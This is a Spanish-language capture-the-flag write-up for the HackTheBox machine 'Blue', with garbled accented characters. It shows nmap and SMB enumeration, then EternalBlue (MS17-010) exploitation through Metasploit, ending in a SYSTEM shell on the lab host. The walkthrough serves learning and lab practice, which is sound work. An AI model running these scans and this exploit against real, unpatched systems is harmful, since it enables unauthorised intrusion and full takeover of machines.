## Introducci贸n
El d铆a de hoy veremos la m谩quina **Blue** de la plataforma de HackTheBox. Se trata de una m谩quina Windows de nivel f谩cil que aborda los siguientes conceptos:

- SMB Enumeration
- Vulnerability Detection Using Nmap Scripts
- Exploitation of MS17-010 (EternalBlue) with Metasploit

## Resoluci贸n

# Reconocimiento

Iniciamos el proceso con un escaneo exhaustivo de puertos utilizando `nmap` para identificar los servicios activos en el sistema objetivo:
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.40
```
```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

Realizamos un segundo escaneo m谩s detallado sobre los puertos m谩s relevantes:
```bash
nmap -p 135,139,445 -sCV -oA scans/nmap-tcpscripts 10.10.10.40
```
```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

El escaneo nos revela que se trata de una m谩quina con **Windows 7 Professional SP1**. Los puertos disponibles son los t铆picos de un entorno Windows: RPC (135), NetBIOS (139) y SMB (445).

### Puerto 445 - SMB

#### Enumeraci贸n de recursos compartidos

Utilizamos `smbmap` para enumerar los recursos compartidos disponibles. El truco de pasar credenciales incorrectas permite obtener acceso como sesi贸n de invitado:
```bash
smbmap -H 10.10.10.40 -u "cualquier" -p "cualquier"
```
```
Disk            Permissions     Comment
----            -----------     -------
ADMIN$          NO ACCESS       Remote Admin
C$              NO ACCESS       Default share
IPC$            NO ACCESS       Remote IPC
Share           READ ONLY
Users           READ ONLY
```

Encontramos dos recursos con acceso de lectura: `Share` y `Users`. Al conectarnos con `smbclient` a ambos, comprobamos que est谩n vac铆os o contienen 煤nicamente carpetas por defecto sin contenido relevante.

#### Detecci贸n de vulnerabilidades

Ejecutamos los scripts de `vuln` de Nmap contra el puerto SMB para comprobar si existe alguna vulnerabilidad conocida:
```bash
nmap -p 445 --script vuln -oA scans/nmap-smbvulns 10.10.10.40
```
```
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010).
|     Disclosure date: 2017-03-14
```

隆Bingo! El sistema es vulnerable a **MS17-010**, tambi茅n conocido como **EternalBlue**.

# Explotaci贸n

### Contexto: 驴Qu茅 es MS17-010 (EternalBlue)?

MS17-010, popularmente conocido como EternalBlue, es una vulnerabilidad cr铆tica de ejecuci贸n remota de c贸digo sin autenticaci贸n que afecta al protocolo SMBv1 de Windows. Fue filtrada por el grupo Shadow Brokers y posteriormente utilizada como vector de propagaci贸n del ransomware WannaCry en mayo de 2017. Permite a un atacante ejecutar c贸digo arbitrario con privilegios de SYSTEM directamente, sin necesidad de credenciales.

### M茅todo 1: Metasploit

La forma m谩s sencilla y estable de explotar esta vulnerabilidad es mediante Metasploit. Iniciamos la consola y buscamos los m贸dulos disponibles para MS17-010:
```bash
msfconsole
msf6 > search ms17-010
```
```
#  Name                                           Rank     Description
-  ----                                           ----     -----------
0  exploit/windows/smb/ms17_010_eternalblue       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
1  exploit/windows/smb/ms17_010_eternalblue_win8  average  MS17-010 EternalBlue para Win8+
2  exploit/windows/smb/ms17_010_psexec            normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion
3  auxiliary/admin/smb/ms17_010_command           normal   MS17-010 Remote Windows Command Execution
4  auxiliary/scanner/smb/smb_ms17_010             normal   MS17-010 SMB RCE Detection
```

Seleccionamos el m贸dulo `0` y configuramos los par谩metros necesarios:
```bash
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.14
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

El exploit se ejecuta con 茅xito y obtenemos una sesi贸n Meterpreter como **NT AUTHORITY\SYSTEM**:
```
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Desde Meterpreter lanzamos una shell de comandos convencional para mayor comodidad:
```bash
meterpreter > shell
```
```
C:\Windows\system32> whoami
nt authority\system
```

Ambas flags se encuentran accesibles directamente, ya que tenemos el m谩ximo nivel de privilegios desde el primer momento:

La flag de usuario se encuentra en `C:\Users\haris\Desktop\user.txt` y la flag de root en `C:\Users\Administrator\Desktop\root.txt`.

隆Ya somos administradores! 